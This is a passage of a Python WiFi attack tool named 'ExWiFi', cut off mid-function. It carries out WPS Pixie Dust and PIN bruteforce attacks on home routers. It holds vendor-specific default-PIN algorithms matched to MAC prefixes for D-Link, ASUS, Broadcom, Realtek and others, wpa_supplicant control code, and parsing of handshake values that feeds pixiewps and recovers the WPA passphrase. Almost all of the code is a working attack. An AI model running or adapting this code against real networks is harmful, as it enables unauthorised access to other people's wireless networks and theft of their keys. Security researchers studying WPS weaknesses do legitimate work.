#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ExWiFi - Advanced WiFi Security Testing Tool
Modernized and Enhanced Version
Code by ErrorX
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import json
import logging
import threading
from datetime import datetime
import collections
import statistics
import csv
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
from enum import Enum
import argparse
import signal
import atexit

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('exwifi.log'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

# Modern color support
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class AttackType(Enum):
    PIXIE_DUST = "pixie_dust"
    BRUTEFORCE = "bruteforce"
    SMART_BRUTEFORCE = "smart_bruteforce"
    SINGLE_PIN = "single_pin"

@dataclass
class NetworkInfo:
    bssid: str
    essid: str
    security_type: str
    signal_level: int
    wps_enabled: bool
    wps_locked: bool
    model: str = ""
    model_number: str = ""
    device_name: str = ""
    channel: int = 0
    frequency: str = ""

@dataclass
class AttackResult:
    success: bool
    pin: Optional[str] = None
    psk: Optional[str] = None
    essid: Optional[str] = None
    bssid: Optional[str] = None
    error_message: Optional[str] = None
    attack_type: Optional[AttackType] = None
    duration: float = 0.0

class ModernUI:
    """Modern UI with better formatting and progress indicators"""
    
    @staticmethod
    def print_banner():
        """Display modern banner"""
        banner = f"""
{Colors.BOLD}{Colors.OKCYAN}
╔══════════════════════════════════════════════════════════════╗
║                    ExWiFi - Advanced WiFi Security           ║
║                        Enhanced Edition 2025                 ║
║                          Code by ErrorX                      ║
╚══════════════════════════════════════════════════════════════╝
{Colors.ENDC}
"""
        print(banner)

    @staticmethod
    def print_status(message: str, status_type: str = "info"):
        """Print status message with color coding"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        if status_type == "success":
            print(f"{Colors.OKGREEN}[✓] {timestamp} {message}{Colors.ENDC}")
        elif status_type == "error":
            print(f"{Colors.FAIL}[✗] {timestamp} {message}{Colors.ENDC}")
        elif status_type == "warning":
            print(f"{Colors.WARNING}[!] {timestamp} {message}{Colors.ENDC}")
        elif status_type == "info":
            print(f"{Colors.OKBLUE}[*] {timestamp} {message}{Colors.ENDC}")
        else:
            print(f"[*] {timestamp} {message}")

    @staticmethod
    def print_progress(current: int, total: int, prefix: str = "Progress"):
        """Display progress bar"""
        bar_length = 50
        filled_length = int(round(bar_length * current / float(total)))
        percents = round(100.0 * current / float(total), 1)
        bar = '█' * filled_length + '-' * (bar_length - filled_length)
        print(f'\r{prefix}: [{bar}] {percents}% ({current}/{total})', end='')
        if current == total:
            print()

class ConfigurationManager:
    """Manage tool configuration and settings"""
    
    def __init__(self, config_file: str = "exwifi_config.json"):
        self.config_file = config_file
        self.config = self.load_config()
    
    def load_config(self) -> dict:
        """Load configuration from file"""
        default_config = {
            "interface": "wlan0",
            "timeout": 30,
            "max_retries": 3,
            "delay_between_attempts": 1.0,
            "save_results": True,
            "verbose_logging": False,
            "auto_save_session": True,
            "default_attack_type": "pixie_dust"
        }
        
        try:
            if os.path.exists(self.config_file):
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    default_config.update(config)
        except Exception as e:
            logger.warning(f"Could not load config file: {e}")
        
        return default_config
    
    def save_config(self):
        """Save current configuration"""
        try:
            with open(self.config_file, 'w') as f:
                json.dump(self.config, f, indent=2)
        except Exception as e:
            logger.error(f"Could not save config: {e}")
    
    def get(self, key: str, default=None):
        """Get configuration value"""
        return self.config.get(key, default)
    
    def set(self, key: str, value):
        """Set configuration value"""
        self.config[key] = value
        self.save_config()
 
class NetworkAddress:
    """Enhanced MAC address handling with validation"""
    
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            if not self._is_valid_mac(self._str_repr):
                raise ValueError(f"Invalid MAC address format: {mac}")
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @staticmethod
    def _is_valid_mac(mac: str) -> bool:
        """Validate MAC address format"""
        pattern = re.compile(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$')
        return bool(pattern.match(mac))

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        if not self._is_valid_mac(value):
            raise ValueError(f"Invalid MAC address: {value}")
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other
        return self

    def __isub__(self, other):
        self.integer -= other
        return self

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'

class EnhancedWPSpin:
    """Enhanced WPS pin generator with better algorithms and validation"""
    
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        # Enhanced algorithm definitions with better documentation
        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
            # Static pin algos
            'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}
        }

    @staticmethod
    def checksum(pin):
        """
        Standard WPS checksum algorithm.
        @pin — A 7 digit pin to calculate the checksum for.
        Returns the checksum value.
        """
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """
        WPS pin generator with enhanced error handling
        @algo — the WPS pin algorithm ID
        Returns the WPS pin string value
        """
        try:
            mac = NetworkAddress(mac)
            if algo not in self.algos:
                raise ValueError(f'Invalid WPS pin algorithm: {algo}')
            pin = self.algos[algo]['gen'](mac)
            if algo == 'pinEmpty':
                return pin
            pin = pin % 10000000
            pin = str(pin) + str(self.checksum(pin))
            return pin.zfill(8)
        except Exception as e:
            logger.error(f"Error generating PIN with algorithm {algo}: {e}")
            return None

    def getAll(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC with enhanced error handling
        """
        res = []
        try:
            for ID, algo in self.algos.items():
                if algo['mode'] == self.ALGO_STATIC and not get_static:
                    continue
                item = {}
                item['id'] = ID
                if algo['mode'] == self.ALGO_STATIC:
                    item['name'] = 'Static PIN — ' + algo['name']
                else:
                    item['name'] = algo['name']
                item['pin'] = self.generate(ID, mac)
                if item['pin'] is not None:
                    res.append(item)
        except Exception as e:
            logger.error(f"Error getting all PINs for MAC {mac}: {e}")
        return res

    def getList(self, mac, get_static=True):
        """
        Get all WPS pin's for single MAC as list
        """
        res = []
        try:
            for ID, algo in self.algos.items():
                if algo['mode'] == self.ALGO_STATIC and not get_static:
                    continue
                pin = self.generate(ID, mac)
                if pin is not None:
                    res.append(pin)
        except Exception as e:
            logger.error(f"Error getting PIN list for MAC {mac}: {e}")
        return res

    def getSuggested(self, mac):
        """
        Get all suggested WPS pin's for single MAC
        """
        try:
            algos = self._suggest(mac)
            res = []
            for ID in algos:
                algo = self.algos[ID]
                item = {}
                item['id'] = ID
                if algo['mode'] == self.ALGO_STATIC:
                    item['name'] = 'Static PIN — ' + algo['name']
                else:
                    item['name'] = algo['name']
                item['pin'] = self.generate(ID, mac)
                if item['pin'] is not None:
                    res.append(item)
            return res
        except Exception as e:
            logger.error(f"Error getting suggested PINs for MAC {mac}: {e}")
            return []

    def getSuggestedList(self, mac):
        """
        Get all suggested WPS pin's for single MAC as list
        """
        try:
            algos = self._suggest(mac)
            res = []
            for algo in algos:
                pin = self.generate(algo, mac)
                if pin is not None:
                    res.append(pin)
            return res
        except Exception as e:
            logger.error(f"Error getting suggested PIN list for MAC {mac}: {e}")
            return []

    def getLikely(self, mac):
        """Get most likely PIN for MAC address"""
        try:
            res = self.getSuggestedList(mac)
            if res:
                return res[0]
            else:
                return None
        except Exception as e:
            logger.error(f"Error getting likely PIN for MAC {mac}: {e}")
            return None

    def _suggest(self, mac):
        """
        Get algos suggestions for single MAC
        Returns the algo ID
        """
        try:
            mac = mac.replace(':', '').upper()
            algorithms = {
                'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A96BF', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
                'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
                'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
                'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
                'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
                'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C860007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
                'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
                'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
                'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
                'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
                'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
                'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
                'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
                'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
                'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
                'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
                'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
                'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
                'pinRealtek1': ('0014D1', '000C42', '000EE8'),
                'pinRealtek2': ('007263', 'E4BEED'),
                'pinRealtek3': ('08C6B3',),
                'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
                'pinUR814AC': ('D4BF7F60',),
                'pinUR825AC': ('D4BF7F5',),
                'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
                'pinEdimax': ('801F02', '00E04C'),
                'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
                'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
                'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
                'pinONO': ('5C353B', 'DC537C')
            }
            res = []
            for algo_id, masks in algorithms.items():
                for mask in masks:
                    if mac.startswith(mask):
                        res.append(algo_id)
                        break
            return res
        except Exception as e:
            logger.error(f"Error suggesting algorithms for MAC {mac}: {e}")
            return []

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        # Get the NIC part
        nic = mac.integer & 0xFFFFFF
        # Calculating pin
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def recvuntil(pipe, what):
    """Enhanced receive until function with better error handling"""
    try:
        s = ''
        while True:
            inp = pipe.stdout.read(1)
            if inp == '':
                return s
            s += inp
            if what in s:
                return s
    except Exception as e:
        logger.error(f"Error in recvuntil: {e}")
        return ''

def get_hex(line):
    """Enhanced hex extraction with better error handling"""
    try:
        a = line.split(':', 3)
        if len(a) >= 3:
            return a[2].replace(' ', '').upper()
        else:
            logger.warning(f"Invalid line format for hex extraction: {line}")
            return ''
    except Exception as e:
        logger.error(f"Error extracting hex from line: {e}")
        return ''

class PixiewpsData:
    """Enhanced Pixiewps data handling with better validation"""
    
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        """Clear all data"""
        self.__init__()

    def got_all(self):
        """Check if all required data is available"""
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        """Generate pixiewps command with validation"""
        if not self.got_all():
            logger.warning("Not all required data is available for pixiewps command")
            return None
            
        try:
            pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                        " --e-hash2 {} --authkey {} --e-nonce {}".format(
                        self.pke, self.pkr, self.e_hash1,
                        self.e_hash2, self.authkey, self.e_nonce)
            if full_range:
                pixiecmd += ' --force'
            return pixiecmd
        except Exception as e:
            logger.error(f"Error generating pixiewps command: {e}")
            return None

class ConnectionStatus:
    """Enhanced connection status tracking"""
    
    def __init__(self):
        self.status = ''   # Must be WSC_NACK, WPS_FAIL or GOT_PSK
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''

    def isFirstHalfValid(self):
        """Check if first half of PIN is valid"""
        return self.last_m_message > 5

    def clear(self):
        """Clear all status data"""
        self.__init__()

class BruteforceStatus:
    """Enhanced bruteforce status tracking with better statistics"""
    
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()   # Last PIN attempt start time
        self.attempts_times = collections.deque(maxlen=15)

        self.counter = 0
        self.statistics_period = 5

    def display_status(self):
        """Display bruteforce status with enhanced formatting"""
        try:
            if len(self.attempts_times) > 0:
                average_pin_time = statistics.mean(self.attempts_times)
            else:
                average_pin_time = 0.0
                
            if len(self.mask) == 4:
                percentage = int(self.mask) / 11000 * 100
            else:
                percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
                
            ModernUI.print_status(f'{percentage:.2f}% complete @ {self.start_time} ({average_pin_time:.2f} seconds/pin)', 'info')
        except Exception as e:
            logger.error(f"Error displaying bruteforce status: {e}")

    def registerAttempt(self, mask):
        """Register a bruteforce attempt with enhanced tracking"""
        try:
            self.mask = mask
            self.counter += 1
            current_time = time.time()
            self.attempts_times.append(current_time - self.last_attempt_time)
            self.last_attempt_time = current_time
            if self.counter == self.statistics_period:
                self.counter = 0
                self.display_status()
        except Exception as e:
            logger.error(f"Error registering bruteforce attempt: {e}")

    def clear(self):
        """Clear bruteforce status"""
        self.__init__()

class EnhancedCompanion:
    """Enhanced main application with better error handling and modern features"""
    
    def __init__(self, interface, save_result=False, print_debug=False, config=None):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug
        self.config = config or ConfigurationManager()
        
        # Enhanced initialization with better error handling
        try:
            self.tempdir = tempfile.mkdtemp()
            with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
                temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
                self.tempconf = temp.name
            self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
            self.__init_wpa_supplicant()

            self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
            self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
            self.retsock.bind(self.res_socket_file)

            self.pixie_creds = PixiewpsData()
            self.connection_status = ConnectionStatus()

            user_home = str(pathlib.Path.home())
            self.sessions_dir = f'{user_home}/.ErrorX/sessions/'
            self.pixiewps_dir = f'{user_home}/.ErrorX/pixiewps/'
            self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
            
            # Create directories with better error handling
            for directory in [self.sessions_dir, self.pixiewps_dir]:
                if not os.path.exists(directory):
                    os.makedirs(directory, exist_ok=True)

            self.generator = EnhancedWPSpin()
            
            # Register cleanup on exit
            atexit.register(self.cleanup)
            
        except Exception as e:
            logger.error(f"Failed to initialize EnhancedCompanion: {e}")
            raise

    def __init_wpa_supplicant(self):
        """Initialize wpa_supplicant with enhanced error handling"""
        try:
            ModernUI.print_status('Running wpa_supplicant…', 'info')
            cmd = f'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{self.interface} -c{self.tempconf}'
            self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                         stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
            
            # Wait for wpa_supplicant control interface initialization with timeout
            timeout = 30
            start_time = time.time()
            while not os.path.exists(self.wpas_ctrl_path):
                if time.time() - start_time > timeout:
                    raise TimeoutError("wpa_supplicant failed to initialize within timeout")
                time.sleep(0.1)
                
        except Exception as e:
            logger.error(f"Failed to initialize wpa_supplicant: {e}")
            raise

    def sendOnly(self, command):
        """Sends command to wpa_supplicant with error handling"""
        try:
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        except Exception as e:
            logger.error(f"Failed to send command '{command}': {e}")
            raise

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply with error handling"""
        try:
            self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
            (b, address) = self.retsock.recvfrom(4096)
            inmsg = b.decode('utf-8', errors='replace')
            return inmsg
        except Exception as e:
            logger.error(f"Failed to send/receive command '{command}': {e}")
            raise

    def __handle_wpas(self, pixiemode=False, verbose=None):
        """Enhanced wpa_supplicant output handling with better error handling"""
        if not verbose:
            verbose = self.print_debug
            
        try:
            line = self.wpas.stdout.readline()
            if not line:
                self.wpas.wait()
                return False
            line = line.rstrip('\n')

            if verbose:
                sys.stderr.write(line + '\n')

            if line.startswith('WPS: '):
                if 'Building Message M' in line:
                    n = int(line.split('Building Message M')[1].replace('D', ''))
                    self.connection_status.last_m_message = n
                    ModernUI.print_status(f'Sending WPS Message M{n}…', 'info')
                elif 'Received M' in line:
                    n = int(line.split('Received M')[1])
                    self.connection_status.last_m_message = n
                    ModernUI.print_status(f'Received WPS Message M{n}', 'info')
                    if n == 5:
                        ModernUI.print_status('The first half of the PIN is valid', 'success')
                elif 'Received WSC_NACK' in line:
                    self.connection_status.status = 'WSC_NACK'
                    ModernUI.print_status('Received WSC NACK', 'warning')
                    ModernUI.print_status('Error: wrong PIN code', 'error')
                elif 'Enrollee Nonce' in line and 'hexdump' in line:
                    self.pixie_creds.e_nonce = get_hex(line)
                    assert(len(self.pixie_creds.e_nonce) == 16*2)
                    if pixiemode:
                        ModernUI.print_status(f'E-Nonce: {self.pixie_creds.e_nonce}', 'info')
                elif 'DH own Public Key' in line and 'hexdump' in line:
                    self.pixie_creds.pkr = get_hex(line)
                    assert(len(self.pixie_creds.pkr) == 192*2)
                    if pixiemode:
                        ModernUI.print_status(f'PKR: {self.pixie_creds.pkr}', 'info')
                elif 'DH peer Public Key' in line and 'hexdump' in line:
                    self.pixie_creds.pke = get_hex(line)
                    assert(len(self.pixie_creds.pke) == 192*2)
                    if pixiemode:
                        ModernUI.print_status(f'PKE: {self.pixie_creds.pke}', 'info')
                elif 'AuthKey' in line and 'hexdump' in line:
                    self.pixie_creds.authkey = get_hex(line)
                    assert(len(self.pixie_creds.authkey) == 32*2)
                    if pixiemode:
                        ModernUI.print_status(f'AuthKey: {self.pixie_creds.authkey}', 'info')
                elif 'E-Hash1' in line and 'hexdump' in line:
                    self.pixie_creds.e_hash1 = get_hex(line)
                    assert(len(self.pixie_creds.e_hash1) == 32*2)
                    if pixiemode:
                        ModernUI.print_status(f'E-Hash1: {self.pixie_creds.e_hash1}', 'info')
                elif 'E-Hash2' in line and 'hexdump' in line:
                    self.pixie_creds.e_hash2 = get_hex(line)
                    assert(len(self.pixie_creds.e_hash2) == 32*2)
                    if pixiemode:
                        ModernUI.print_status(f'E-Hash2: {self.pixie_creds.e_hash2}', 'info')
                elif 'Network Key' in line and 'hexdump' in line:
                    self.connection_status.status = 'GOT_PSK'
                    self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
            elif ': State: ' in line:
                if '-> SCANNING' in line:
                    self.connection_status.status = 'scanning'
                    ModernUI.print_status('Scanning…', 'info')
            elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
                self.connection_status.status = 'WPS_FAIL'
                ModernUI.print_status('wpa_supplicant returned WPS-FAIL', 'error')
            elif 'Trying to authenticate with' in line:
                self.connection_status.status = 'authenticating'
                if 'SSID' in line:
